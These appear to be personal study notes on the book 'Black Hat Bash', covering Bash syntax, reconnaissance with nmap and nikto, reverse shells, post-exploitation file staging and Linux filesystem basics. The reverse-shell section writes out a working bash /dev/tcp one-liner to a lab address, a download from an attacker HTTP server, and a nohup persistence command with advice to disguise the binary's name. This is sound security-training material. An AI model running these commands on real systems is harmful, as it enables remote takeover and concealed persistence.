###############################################################################
#                               Black Hat Bash                                #
#                                                                             #
###############################################################################

################################# Bash Basics #################################

# Debugging Bash files
* bash -n script.sh
* -n flag shows errors

* bash -x script.sh
* -x flag turns on verbose mode

# Variables - variables.sh
* Var=value
* Access variables with '$' sign
  Ex: book="black hat bash"
      echo ${book}
* unset variables using the unset cmd
  unset var

* Expressions
  - result=$((4 * 4))           // Double paranthesis syntax
  - result=$(expr 5 + 505)      // expr command evaluates expr

# Arrays - arrays.sh
* Set an array
  - array=(1 2 3)
* Prints out the first element
  - echo ${array[0]}
* Prints out all the elements
  - echo ${array[*]}
* Remove element from array
  - unset array[1]
* Swap elements from array
  - array[0]="192.168.1.10"

# Streams
* Streams are files that act as communication channels between a program and 
  its environment

  Bash Data Streams
  Stream name     Description                             File Descriptor 
     stdin        Data coming into a program as input     0
    stdout        Data coming out of a program            1
    stderr        Errors coming out of a program          2

# Control Operators - controlflow.sh
  Bash Control Operators
  Operator    Description
  &           Sends a cmd to the background
  &&          Logical AND
  ( and )     Command Grouping
  ;           List terminator. A cmd following the terminator will run after
              the preceding cmd has finished 
  ;;          Ends a case statement
  |           Redirects the output of a cmd as input to another (pipe)
  ||          Logical OR

# Redirection Operators
  Bash Redirection Operators
  Operator    Description
  >           Redirects stdout to file
  >>          Redirects stdout to a file by appending 
  &>          Redirects stdout and stderr to a file
  &>>         Redirects stdout and stderr to a file by appending
  <           Redirects input to a cmd
  <<          heredoc, Redirects multiple input lines to a cmd
  |           pipe

# Positional Arguments - arguments.sh
* Bash script can access args passed to it on the cmd line by using variables
  $1, $2, ...
  ${1}

# Input Prompting - input.sh
* read -r variable

# Exit Codes
* Bash cmds return exit codes which indicate the success or failure of the cmd
  - 0 success
  - 1 - 255 is failure
  - Special variable $?
* Set a script's exit code
  - exit 233

# Test Operators
  File Test Operators - man test
  Operator    Description
  -d          Checks file is a directory
  -r          Checks file is readable
  -x          Checks file is executable
  -w          Checks file is writable
  -f          Checks file is a regular file
  -s          Checks file size is greater than zero

  String Comparison Operators
  Operator    Description
  =           Checks =
  ==          Checks strings are equivalent
  !=          Checks string is not equivalent
  <           Checks string comes before another string (alphabetical)
  >           Checks string comes after another string (alphabetical)
  -z          Checks string is null
  -n          Checks string is not null

  Integer Comparison Operators
  Operators   Descriptions
  -eq         numbers are equal
  -ne         number is not equal
  -ge         number is greater or equal
  -gt         number is greater
  -lt         number is less 
  -le         number is less or equal

# If Conditions - ifcondition.sh
  if [[ condition ]]; then
    # Condition is met
  else 
    # Condition is not met
  fi

* Linking conditions together such as
  [[ condition ]] && [[ condition ]]

# Testing Command Success
* Can test the exit code of commands to determine whether they were successful
  if command # successful
  if ! command # failure

# Functions - function.sh
  func(){
    # func body
  }

* To call a function enter the name

# Loops
* while loops
  while condition; do
    # run commands
  done
  - For reading line by line in file,
  while read -r line; do
    # commands
  done < file

* until
  runs so long as the condition fails
  until condition; do
    # run commands
  done
  
* for
  for variable in "${LIST[@]}; do
    # run commands
  done
  
  for index in $(seq 1 10); do
    # run commands
  done
  
  The list or sequence can also be $@ which are parameters
  Can also be on the output of a command such as ls
  
# Case statements
  - test multiple conditions cleanly
  case EXPR in 
    PATTERN1)
      # command
    ;;
    PATTERN2)
    ;;
  
# Text Processing and Parsing
* grep filtering 
  - used to extract any lines containing the pattern
  - use -e flag for multiple patterns or \|
    grep -e "pattern1" -e "pattern2" file
    grep "pattern1\|pattern2" file
  - use pipes to provide one cmd's output as the input to another 
    ps | grep ""
  - use -v flag to exclude lines containing the pattern
* awk filtering
  - good for data processing extraction
  - awk treats the first field of every line in the file. spaces and tabs
    are separators 
    awk '{print $1}' file     # extract the 1st field of every line from file
    $1, $2, ... , $NF
  - Change the delimiter with -F
    awk -F',' '{print $1}' file
    
# Editing Streams with sed
* sed stream editor 
  sed 's/word/replace/g' file     # find and replace word 
  - delete lines in file
    sed '1d' file           # delete first line
    sed '$d' file           # delete last line
    sed '5,7d' file         # delete multiple lines
    sed -n '2,15 p' file    # print specific line ranges
    
# Job Control
* Foreground Job: Cmds that run in a terminal that occupy that terminal until 
  cmd that finished
* Background Job: Cmds that are in the background, unblock the execution
  of other cmds
* Use the & to send the cmd to the background
  sleep 10 &      # sends sleep process to the background
  - $ jobs to list jobs
* Send job to foreground/background
  - fg %1      # Where 1 is the job id
  - bg %1
  - kill process_id
  - CTRL-Z      # stop process

# Keeping Jobs after Logout
* A process will be killed if the terminal is closed regardless of foreground
  or background
  - use the nohup command (no hangup). Create file nohup.out with stdout stream
    $ nohup ./script.sh
    
# Aliases
* asign a custom shorter name 
  $ alias longls='ls -al'
  $ longls
* Can make aliases permanent witth ~/.bashrc by adding the alias to the end
  of the file
  then source ~/.bashrc
  - We can also add variables to bashrc

# Timeout
* timeout command run commands and exit after certain amount of time
  $ timeout 10s cmd
  
############################### Reconaissance #################################
  
# Host Discovery
* Nmap ping sweep. Find live hosts on a network by sending them a ping command
  - $ nmap -sn 172.16.10.0/24
  - much faster than pinging every host individually
* arp-scan to find hosts on a network when the test is done locally
  - sends an ARP packets to host network and displays any responses received
  - $ sudo arp-scan 172.16.10.0/24 -I br_public
  
# Port Scanning
* Nmap port scanning
  - $ nmap domain
  - $ nmap ip_addr
  * With no special options, nmap performs a SYN scan (half-open scan).
    Sends SYN packet and waits for response. Nmap will not complete full
    TCP handshake - no ACK packet is sent
  * Only scan the top 1,000 popular ports
  * Only scan TCP ports, not UDP
* Rustscan
  - $ rustscan -a (address arg) 172.16.10.0/24
  - -g greppable flag cleaner output
  - -r range of ports 1-1024
* Netcat
  - $ nc -z (zero input/output won't send any data) -v (verbose flag) 
    <target ip> <ports>

# Banner Grabbing
* The process of extracting the information published by remote network
  services when a connection is established. 
* Services often transmit banners to greet clients
  - SSH Servers, FTP, Telnet, network printers, IOT devices...
 
 * Active banner grabbing - we can connect to port on the target ip addr. 
   A small advert or banner is shown
   
* HTTP Head requests with curl or netcat
   

# Detecting Operating Systems
* Possible with TCP/IP fingerprinting
  - $ sudo nmap -O -iL <ip_addr file>


# Scanning websites
* Nikto
  - banner grabbing, and basic security analysis 
  - XSS, clickjacking, directory indexing
  - $ nikto -host <ip> -port <port>

############################### Reverse Shells ################################

# Reverse Shells
* Ingress vs. Egress Controls
  - Ingress: Incoming connections
  - Egress: Outgoing connections
* Require payload and listener
  - payload runs on the target machine
  - shell listener is a program that runs on the attacker machine to receive
    incoming reverse shell connections from comprimised targets
    listens on a specific port waiting for connection to be established
    and provides interactive shell session where the attacker can enter cmds 
    to the target
* Setup a listener:
  - $ nc -l -p <port> -vv
    netcat listen on port
  - $ bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
    - bash -c runs cmd inside the single quotes in a new instance of bash
    - bash -i starts interactive bash shell
    - >& /dev/tcp/172.16.10.1/1337 redirects stdout 1 & stderr 2 of the
      interactive bash shell to a TCP connection at ip addr 172.16.10.1
      port 1337. Essentially sends output of a shell to a remote server
    - 0>&1 redirects stdin 0 of interactive bash shell to come from the 
      same place as the stdout 1. makes shell accept input from the TCP
      connection - thus remote server can send cmds to be executed by the shell
  - For OS cmd injection in the book, use the | pipe to run the cmd from
    donate page directly into the os.
  
# Post exploitation binary staging
* The target may not have certain binaries or files required.
  - Create an http server with python on attacking machine
    - $ python -m http.server
  - Then download files using ex. curl
    - $ curl -O http://172.16.10.1:8000/<filename>
  - The file can then be transferred to the target machine
  - Can also download binaries from trusted sites 
* Persistance
  - Write a program so that the target constantly connects to attacker
  - send the process to the background & keep running with nohup
  - $ nohup ./reverse_shell_monitor.sh > /dev/null 2>&1 &
  - Change the binary name to something less suspicious
  
# Initial Access With Brute Force
* ssh 
  - Allows both password-based and key-based authentication
* Brute Force
  - dictionary-based brute-force attack against an SSH Server 
  - list of usernames, list of passwords

############################# Local Info Gathering ############################

# The Filesystem Hierarchy Standard
  Directory     Description
      /         primary parent dir called root
    /var        dir for nonstatic variable files. contains application logfiles
                or processed tasks such as scheduled and print jobs. also cache
    /etc        dir for config files .conf also contains /etc/passwd, 
                /etc/group and /etc/shadow where usr accounts, group info and 
                password hashes exist
    /bin        dir for binary utulities. stores bin
    /sbin       dir for system bins
    /dev        dir provides access to device files,  like disk partitions,
                thumb drives, and external hard drives
    /boot       dir for bootloaders, kernel files, and RAM
    /home       dr containing home dir of local system user accounts.
                active system user accounts usually have subdir as their 
                assigned home dir
    /root       dir containing home dir of root user account
    /tmp        dir for temporarily written files and dirs
    /proc       virtual filesystem for processes and kernel data
    /usr        dir for user bins, man pages & kernel srcs, header files
    /run        dir for runtime data. describes the state of the system since
                it was last booted
    /opt        dir for software apps
    /mnt        dir for mounting network shares or other network devices.
                used for mounting devices to local filesystem
    /media      dir for removable devices, CD drives
    /lib, /lib32, /lib64 dir for shred libs needed to boot system 
    /srv        dir for data commonly served by network services
    
# Users and Groups
* Local Accounts
  - User accounts can be found in /etc/passwd and groups in /etc/group
  
  /etc/passwd fields seperated by colons
  Account  Password  User ID  Group ID  Comment  Home directory  Default shell
  root     x         0        0         root     /root           /bin/bash































